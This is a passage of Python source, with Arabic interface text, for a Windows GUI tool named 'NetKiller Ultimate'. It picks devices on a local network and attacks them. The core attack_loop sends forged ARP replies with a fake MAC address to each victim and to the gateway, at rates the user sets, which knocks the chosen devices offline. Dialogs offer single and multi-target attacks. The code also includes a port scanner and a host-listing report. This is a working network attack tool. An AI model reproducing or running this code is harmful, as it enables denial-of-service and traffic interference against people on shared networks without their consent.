        self.attack_thread = threading.Thread(target=self.attack_loop, args=(valid_targets, self.gateway_ip, self.gateway_mac, self.interface, self.attack_speed), daemon=True)
        self.attack_thread.start()

    def attack_loop(self, targets, gateway_ip, gateway_mac, interface, speed):
        fake_mac = "00:00:00:00:00:01"
        last_mac_update = time.time()
        last_stats = time.time()
        packet_count = 0
        start_time = time.time()
        active_targets = targets.copy()
        while self.attack_running:
            try:
                if time.time() - last_mac_update > 3.0:
                    new_gateway = get_mac(gateway_ip, retries=2, timeout=1)
                    if new_gateway:
                        gateway_mac = new_gateway
                    new_active = []
                    for ip, mac in active_targets:
                        new_mac = get_mac(ip, retries=2, timeout=1)
                        if new_mac:
                            new_active.append((ip, new_mac))
                        else:
                            self.log(f"⚠️ الهدف {ip} لم يعد يستجيب")
                    active_targets = new_active
                    last_mac_update = time.time()
                if not active_targets:
                    self.log("⚠️ لا توجد أهداف نشطة، إيقاف الهجوم")
                    break
                for ip, mac in active_targets:
                    if (ip, mac) in self.blacklist:
                        continue
                    pkt_victim = Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac, psrc=gateway_ip, hwsrc=fake_mac)
                    sendp(pkt_victim, verbose=0)
                    pkt_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=ip, hwsrc=fake_mac)
                    sendp(pkt_gateway, verbose=0)
                    packet_count += 2
                if time.time() - last_stats >= 1.0:
                    elapsed = time.time() - start_time
                    rate = packet_count / elapsed if elapsed > 0 else 0
                    target_ips = ", ".join([t[0] for t in active_targets[:3]])
                    if len(active_targets) > 3:
                        target_ips += f" +{len(active_targets)-3}"
                    self.update_stats(packet_count, rate, elapsed, target_ips)
                    last_stats = time.time()
                time.sleep(speed)
            except Exception as e:
                self.log(f"⚠️ خطأ في حلقة الهجوم: {e}")
                time.sleep(1)
        self.restore_all_arp(active_targets, gateway_ip, gateway_mac)

    def restore_all_arp(self, targets, gateway_ip, gateway_mac):
        try:
            self.log("♻️ جاري استعادة ARP للأجهزة النشطة...")
            for ip, mac in targets:
                restore_victim = Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac, psrc=gateway_ip, hwsrc=gateway_mac)
                sendp(restore_victim, count=2, inter=0.1, verbose=0)
                restore_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=ip, hwsrc=mac)
                sendp(restore_gateway, count=2, inter=0.1, verbose=0)
            self.log("✅ تمت استعادة الاتصال للأجهزة النشطة", sound=False)
        except Exception as e:
            self.log(f"❌ فشل استعادة ARP: {e}")

    def stop_attack(self):
        self.attack_running = False
        self.stop_btn.setEnabled(False)
        self.log("⏹️ توقف الهجوم", sound=False)
        disable_ip_forward(self.interface)

    def update_stats(self, count, rate, elapsed, target_info):
        time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        self.stats_label.setText(f"📊 {count} حزمة | {rate:.0f}/ث | {time_str} | الأهداف: {target_info}")

    def multi_attack_window(self):
        if not self.devices:
            QMessageBox.warning(self, "لا توجد أجهزة", "قم بفحص الشبكة أولاً")
            return
        dialog = QDialog(self)
        dialog.setWindowTitle("اختر الأجهزة المستهدفة")
        dialog.setMinimumSize(750, 600)
        layout = QVBoxLayout(dialog)
        label = QLabel("الأجهزة المكتشفة (اختر أهداف متعددة):")
        layout.addWidget(label)
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll_widget = QWidget()
        scroll_layout = QVBoxLayout(scroll_widget)
        self.multi_vars = []
        for dev in self.devices:
            idx, ip, mac, hostname, dtype, mac_status = dev
            cb = QCheckBox(f"{ip} - {hostname} ({dtype}) - {mac} [{mac_status}]")
            self.multi_vars.append((ip, mac, cb))
            scroll_layout.addWidget(cb)
        scroll_layout.addStretch()
        scroll.setWidget(scroll_widget)
        layout.addWidget(scroll)
        speed_layout = QHBoxLayout()
        speed_layout.addWidget(QLabel("سرعة الهجوم (ثانية):"))
        speed_spin = QDoubleSpinBox()
        speed_spin.setRange(0.0001, 0.01)
        speed_spin.setSingleStep(0.0001)
        speed_spin.setValue(self.attack_speed)
        speed_spin.setDecimals(4)
        speed_layout.addWidget(speed_spin)
        layout.addLayout(speed_layout)
        btn_layout = QHBoxLayout()
        ok_btn = QPushButton("💥 ابدأ الهجوم المتعدد")
        ok_btn.clicked.connect(lambda: self.multi_attack_ok(dialog, speed_spin.value()))
        cancel_btn = QPushButton("إلغاء")
        cancel_btn.clicked.connect(dialog.reject)
        btn_layout.addWidget(ok_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)
        dialog.exec()

    def multi_attack_ok(self, dialog, speed):
        selected = []
        for ip, mac, cb in self.multi_vars:
            if cb.isChecked():
                selected.append((ip, mac))
        if not selected:
            QMessageBox.warning(dialog, "تحذير", "لم تختر أي جهاز.")
            return
        self.attack_speed = speed
        dialog.accept()
        self.start_hyper_attack(selected)

    def add_to_multi_target(self, ip, mac):
        self.log(f"➕ {ip} أُضيف للهجوم المتعدد (اختر من النافذة)")

    def open_attack_window(self):
        if not self.devices:
            QMessageBox.warning(self, "لا توجد أجهزة", "قم بفحص الشبكة أولاً")
            return
        dialog = QDialog(self)
        dialog.setWindowTitle("اختر الجهاز المستهدف")
        dialog.setMinimumSize(650, 500)
        layout = QVBoxLayout(dialog)
        label = QLabel("الأجهزة المكتشفة:")
        layout.addWidget(label)
        list_widget = QListWidget()
        for dev in self.devices:
            idx, ip, mac, hostname, dtype, mac_status = dev
            list_widget.addItem(f"{ip} - {hostname} ({dtype}) - {mac} [{mac_status}]")
        layout.addWidget(list_widget)
        speed_layout = QHBoxLayout()
        speed_layout.addWidget(QLabel("سرعة الهجوم (ثانية):"))
        speed_spin = QDoubleSpinBox()
        speed_spin.setRange(0.0001, 0.01)
        speed_spin.setSingleStep(0.0001)
        speed_spin.setValue(self.attack_speed)
        speed_spin.setDecimals(4)
        speed_layout.addWidget(speed_spin)
        layout.addLayout(speed_layout)
        btn_layout = QHBoxLayout()
        ok_btn = QPushButton("🚀 ابدأ الهجوم الخارق")
        ok_btn.clicked.connect(lambda: self.single_attack_ok(dialog, list_widget, speed_spin.value()))
        cancel_btn = QPushButton("إلغاء")
        cancel_btn.clicked.connect(dialog.reject)
        btn_layout.addWidget(ok_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)
        dialog.exec()

    def single_attack_ok(self, dialog, list_widget, speed):
        selected = list_widget.currentRow()
        if selected < 0:
            QMessageBox.warning(dialog, "تحذير", "لم تختر أي جهاز.")
            return
        ip, mac = self.devices[selected][1], self.devices[selected][2]
        self.attack_speed = speed
        dialog.accept()
        self.start_hyper_attack([(ip, mac)])

    def scan_ports(self, ip):
        threading.Thread(target=self._scan_ports, args=(ip,), daemon=True).start()

    def _scan_ports(self, ip):
        self.log(f"🔍 فحص المنافذ لـ {ip}...")
        open_ports = []
        common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
        for port in common_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        if open_ports:
            self.log(f"✅ المنافذ المفتوحة على {ip}: {open_ports}")
        else:
            self.log(f"ℹ️ لا توجد منافذ مفتوحة شائعة على {ip}")

    def add_to_blacklist(self, ip, mac):
        self.blacklist.add((ip, mac))
        self.log(f"➕ {ip} في القائمة السوداء")

    def save_report(self):
        if not self.devices:
            QMessageBox.warning(self, "لا توجد بيانات", "لا يوجد أجهزة لحفظها")
            return
        filename = f"report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("="*80 + "\n")
                f.write("📊 تقرير أجهزة الشبكة - NetKiller Ultimate v12.4\n")
                f.write(f"التاريخ: {datetime.datetime.now()}\n")
                f.write("="*80 + "\n\n")
                for d in self.devices:
                    f.write(f"IP: {d[1]:15} | MAC: {d[2]:17} | {d[3]:30} | {d[4]}\n")
                f.write("\n" + "="*80 + "\n")
                f.write(f"إجمالي الأجهزة: {len(self.devices)}\n")
            self.log(f"✅ حفظ التقرير: {filename}")
            QMessageBox.information(self, "نجاح", f"تم حفظ التقرير:\n{filename}")
        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"فشل الحفظ: {e}")

    def show_people_list(self):
        if not self.devices:
            QMessageBox.warning(self, "لا يوجد أشخاص", "لم يتم العثور على أجهزة بعد")
            return
        dialog = QDialog(self)
        dialog.setWindowTitle("👥 قائمة الأشخاص (الأجهزة)")
        dialog.setMinimumSize(600, 400)
        dialog.setStyleSheet("background-color: #2d1a1a; border: 2px solid #b30000; border-radius: 10px;")
        layout = QVBoxLayout(dialog)
        title = QLabel("الأجهزة المتصلة بالشبكة")
        title.setStyleSheet("color: #cc6666; font-size: 20pt; font-weight: bold;")
        layout.addWidget(title)
        list_widget = QListWidget()
        list_widget.setStyleSheet("background-color: #3d2a2a; color: #f0e0e0; border: 2px solid #b30000; border-radius: 8px;")
        for dev in self.devices:
            idx, ip, mac, hostname, dtype, mac_status = dev
            list_widget.addItem(f"{idx}. {ip} - {hostname} ({dtype}) - MAC: {mac} [{mac_status}]")
        layout.addWidget(list_widget)
        close_btn = QPushButton("إغلاق")
        close_btn.clicked.connect(dialog.accept)
        layout.addWidget(close_btn)
        dialog.exec()

    def closeEvent(self, event):
        self.log("⏹️ جاري إغلاق البرنامج...")
        self.attack_running = False
        if self.attack_thread is not None and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=1.0)
        disable_ip_forward(self.interface)
        event.accept()

# ==================== نقطة الدخول الرئيسية ====================
def main():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    if not install_scapy():
        print("✅ تم تثبيت scapy، يرجى إعادة تشغيل البرنامج.")
        input("اضغط Enter للخروج...")
        sys.exit()
    if not check_pcap():
        msg = "يجب تثبيت Npcap أو WinPcap أولاً.\n"
        msg += "حمّل Npcap من: https://npcap.com\n"
        msg += "وتأكد من تفعيل 'Install Npcap in WinPcap API-compatible Mode'"
        QMessageBox.critical(None, "⚠️ مكتبة الحزم مفقودة", msg)
        sys.exit()
    app = QApplication(sys.argv)
    app.setWindowIcon(create_scary_icon())
    login = LoginDialog()
    if login.exec() != QDialog.Accepted:
        sys.exit()
    window = NetKillerWindow()
    window.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()